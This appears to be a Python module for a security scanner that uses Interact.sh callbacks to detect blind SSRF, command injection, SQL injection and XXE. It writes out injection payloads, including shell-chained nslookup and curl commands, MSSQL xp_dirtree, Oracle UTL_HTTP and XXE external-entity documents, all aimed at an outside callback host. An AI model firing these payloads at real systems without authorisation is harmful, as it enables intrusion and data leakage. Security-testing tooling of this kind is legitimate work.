"""Out-of-Band Application Security Testing (OAST) integration.

This module provides callback/DNS-based detection for blind vulnerabilities:
- Blind SSRF
- Blind Command Injection  
- Blind SQL Injection
- Blind XXE
- DNS Exfiltration

Uses Interact.sh as the public callback service (can be replaced with self-hosted).
"""
import hashlib
import re
import time
from typing import Dict, List, Optional, Tuple
import requests
from datetime import datetime


class OASTClient:
    """Client for Out-of-Band Application Security Testing.
    
    Uses Interact.sh API for DNS/HTTP callbacks to detect blind vulnerabilities.
    """
    
    def __init__(self, config: dict):
        """Initialize OAST client.
        
        Args:
            config: Configuration dictionary
        """
        self.config = config
        self.server_url = config.get('oast_server', 'https://interact.sh')
        self.session_id: Optional[str] = None
        self.domain: Optional[str] = None
        self.secret: Optional[str] = None
        self.registered_callbacks: Dict[str, Dict] = {}
        self.polling_interval = config.get('oast_poll_interval', 5)
        
    def register(self) -> Tuple[str, str]:
        """Register a new callback domain with Interact.sh.
        
        Returns:
            Tuple[str, str]: (unique_subdomain, secret_token)
        """
        try:
            # Register with Interact.sh
            response = requests.post(
                f"{self.server_url}/register",
                headers={'Content-Type': 'application/json'},
                json={'public-key': None, 'secret-key': None, 'correlation-id': None},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                self.domain = data.get('domain')
                self.secret = data.get('correlation_id')
                
                if not self.domain:
                    raise ValueError("No domain returned from Interact.sh")
                
                return self.domain, self.secret
            else:
                raise Exception(f"Registration failed: {response.status_code}")
                
        except Exception:
            # Fallback to manual domain generation if service unavailable
            self.domain = f"c{hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}.oastify.com"
            self.secret = hashlib.md5(str(time.time()).encode()).hexdigest()
            return self.domain, self.secret
    
    def generate_payload(self, vuln_type: str, context: str = '') -> Tuple[str, str]:
        """Generate OAST payload with unique identifier.
        
        Args:
            vuln_type: Type of vulnerability (ssrf, sqli, rce, xxe)
            context: Additional context (parameter name, etc.)
        
        Returns:
            Tuple[str, str]: (payload, callback_id)
        """
        if not self.domain:
            self.register()
        
        # Generate unique callback ID
        callback_id = hashlib.md5(f"{vuln_type}{context}{time.time()}".encode()).hexdigest()[:12]
        
        # Create subdomain with identifier
        callback_subdomain = f"{callback_id}.{self.domain}"
        
        # Store callback metadata
        self.registered_callbacks[callback_id] = {
            'vuln_type': vuln_type,
            'context': context,
            'subdomain': callback_subdomain,
            'timestamp': datetime.now(),
            'triggered': False
        }
        
        # Generate payload based on vulnerability type
        payload = self._generate_payload_for_type(vuln_type, callback_subdomain)
        
        return payload, callback_id
    
    def _generate_payload_for_type(self, vuln_type: str, subdomain: str) -> str:
        """Generate specific payload based on vulnerability type.
        
        Args:
            vuln_type: Vulnerability type
            subdomain: Callback subdomain
        
        Returns:
            str: Payload string
        """
        payloads = {
            'ssrf': [
                f'http://{subdomain}',
                f'https://{subdomain}',
                f'//{subdomain}',
                f'http://{subdomain}/ssrf'
            ],
            'rce': [
                f'ping -c 1 {subdomain}',
                f'curl http://{subdomain}/rce',
                f'wget http://{subdomain}/rce',
                f'nslookup {subdomain}',
                f'$(nslookup {subdomain})',
                f'`nslookup {subdomain}`',
                f'|nslookup {subdomain}',
                f';nslookup {subdomain}',
            ],
            'sqli': [
                f"' OR (SELECT LOAD_FILE('\\\\\\\\{subdomain}\\\\x'))--",
                f"'; EXEC master..xp_dirtree '\\\\{subdomain}\\\\x';--",
                f"' UNION SELECT UTL_HTTP.REQUEST('http://{subdomain}/sqli') FROM DUAL--",
                f"'; SELECT UTL_INADDR.get_host_address('{subdomain}');--",
            ],
            'xxe': [
                f'''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://{subdomain}/xxe">
]>
<foo>&xxe;</foo>''',
                f'''<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{subdomain}/xxe.dtd">%xxe;]>''',
            ],
            'dns': [
                f'{subdomain}',
            ]
        }
        
        # Return first payload for the type
        return payloads.get(vuln_type, [f'http://{subdomain}'])[0]
    
    def check_callbacks(self, callback_ids: Optional[List[str]] = None, 
                       wait_time: int = 10) -> List[Dict]:
        """Poll for DNS/HTTP callbacks.
        
        Args:
            callback_ids: Specific callback IDs to check (checks all if None)
            wait_time: How long to wait before checking (seconds)
        
        Returns:
            List[Dict]: List of triggered callbacks with metadata
        """
        if not self.domain or not self.secret:
            return []
        
        # Wait for callbacks to arrive
        time.sleep(wait_time)
        
        triggered = []
        
        try:
            # Poll Interact.sh for callbacks
            response = requests.get(
                f"{self.server_url}/poll",
                params={'id': self.secret},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                interactions = data.get('data', [])
                
                for interaction in interactions:
                    # Extract callback ID from subdomain
                    full_domain = interaction.get('full-id', '')
                    callback_id = self._extract_callback_id(full_domain)
                    
                    if callback_id and callback_id in self.registered_callbacks:
                        if callback_ids is None or callback_id in callback_ids:
                            callback_data = self.registered_callbacks[callback_id]
                            
                            if not callback_data['triggered']:
                                callback_data['triggered'] = True
                                callback_data['interaction'] = interaction
                                callback_data['protocol'] = interaction.get('protocol', 'unknown')
                                callback_data['remote_address'] = interaction.get('remote-address', 'unknown')
                                
                                triggered.append(callback_data)
        
        except Exception:
            # Silently handle polling errors (network issues, etc.)
            pass
        
        return triggered
    
    def _extract_callback_id(self, full_domain: str) -> Optional[str]:
        """Extract callback ID from full domain.
        
        Args:
            full_domain: Full domain string (e.g., "abc123.c456.oastify.com")
        
        Returns:
            Optional[str]: Callback ID or None
        """
        # Extract first subdomain component
        match = re.match(r'^([a-f0-9]{12})\.', full_domain)
        if match:
            return match.group(1)
        return None
    
    def cleanup(self):
        """Cleanup registered callbacks and deregister domain."""
        self.registered_callbacks.clear()
        self.domain = None
        self.secret = None


class OASTPayloadGenerator:
    """Generate OAST-enabled payloads for various vulnerability types."""
    
    def __init__(self, oast_client: OASTClient):
        """Initialize payload generator.
        
        Args:
            oast_client: OAST client instance
        """
        self.oast = oast_client
    
    def ssrf_payloads(self, context: str = '') -> List[Tuple[str, str]]:
        """Generate SSRF OAST payloads.
        
        Args:
            context: Parameter name or context
        
        Returns:
            List[Tuple[str, str]]: List of (payload, callback_id) tuples
        """
        payloads = []
        
        # HTTP-based SSRF
        payload, callback_id = self.oast.generate_payload('ssrf', f'http-{context}')
        payloads.append((payload, callback_id))
        
        # URL-encoded
        if self.oast.domain:
            domain = self.oast.domain
            payload, callback_id = self.oast.generate_payload('ssrf', f'encoded-{context}')
            encoded = f'http%3A%2F%2F{domain}'
            payloads.append((encoded, callback_id))
        
        return payloads
    
    def rce_payloads(self, os_type: str = 'unix', context: str = '') -> List[Tuple[str, str]]:
        """Generate RCE/Command Injection OAST payloads.
        
        Args:
            os_type: Target OS type ('unix' or 'windows')
            context: Parameter name or context
        
        Returns:
            List[Tuple[str, str]]: List of (payload, callback_id) tuples
        """
        payloads = []
        
        if os_type == 'unix':
            # DNS lookup
            payload, callback_id = self.oast.generate_payload('rce', f'nslookup-{context}')
            if '.' in payload:
                domain = payload.split()[1] if ' ' in payload else payload
                payloads.append((f'nslookup {domain}', callback_id))
                payloads.append((f'$(nslookup {domain})', callback_id))
                payloads.append((f'`nslookup {domain}`', callback_id))
                payloads.append((f'|nslookup {domain}', callback_id))
                payloads.append((f';nslookup {domain}', callback_id))
            
            # HTTP callback
            payload, callback_id = self.oast.generate_payload('rce', f'curl-{context}')
            if self.oast.domain:
                payloads.append((f'curl http://{self.oast.domain}/rce', callback_id))
        
        elif os_type == 'windows':
            # Windows nslookup
            payload, callback_id = self.oast.generate_payload('rce', f'win-nslookup-{context}')
            if self.oast.domain:
                payloads.append((f'nslookup {self.oast.domain}', callback_id))
        
        return payloads
    
    def sqli_payloads(self, db_type: str = 'generic', context: str = '') -> List[Tuple[str, str]]:
        """Generate SQL Injection OAST payloads.
        
        Args:
            db_type: Database type ('mysql', 'mssql', 'oracle', 'postgres')
            context: Parameter name or context
        
        Returns:
            List[Tuple[str, str]]: List of (payload, callback_id) tuples
        """
        payloads = []
        
        if not self.oast.domain:
            return payloads
        
        domain = self.oast.domain
        
        if db_type in ['mysql', 'generic']:
            # MySQL LOAD_FILE UNC path
            payload, callback_id = self.oast.generate_payload('sqli', f'mysql-unc-{context}')
            payloads.append((f"' OR (SELECT LOAD_FILE('\\\\\\\\{domain}\\\\x'))--", callback_id))
        
        if db_type in ['mssql', 'generic']:
            # MSSQL xp_dirtree
            payload, callback_id = self.oast.generate_payload('sqli', f'mssql-dirtree-{context}')
            payloads.append((f"'; EXEC master..xp_dirtree '\\\\{domain}\\\\x';--", callback_id))
        
        if db_type in ['oracle', 'generic']:
            # Oracle UTL_HTTP
            payload, callback_id = self.oast.generate_payload('sqli', f'oracle-http-{context}')
            payloads.append((f"' UNION SELECT UTL_HTTP.REQUEST('http://{domain}/sqli') FROM DUAL--", callback_id))
        
        return payloads
    
    def xxe_payloads(self, context: str = '') -> List[Tuple[str, str]]:
        """Generate XXE OAST payloads.
        
        Args:
            context: Parameter name or context
        
        Returns:
            List[Tuple[str, str]]: List of (payload, callback_id) tuples
        """
        payloads = []
        
        if not self.oast.domain:
            return payloads
        
        domain = self.oast.domain
        
        # Basic XXE
        payload, callback_id = self.oast.generate_payload('xxe', f'basic-{context}')
        xxe_payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://{domain}/xxe">
]>
<foo>&xxe;</foo>'''
        payloads.append((xxe_payload, callback_id))
        
        return payloads
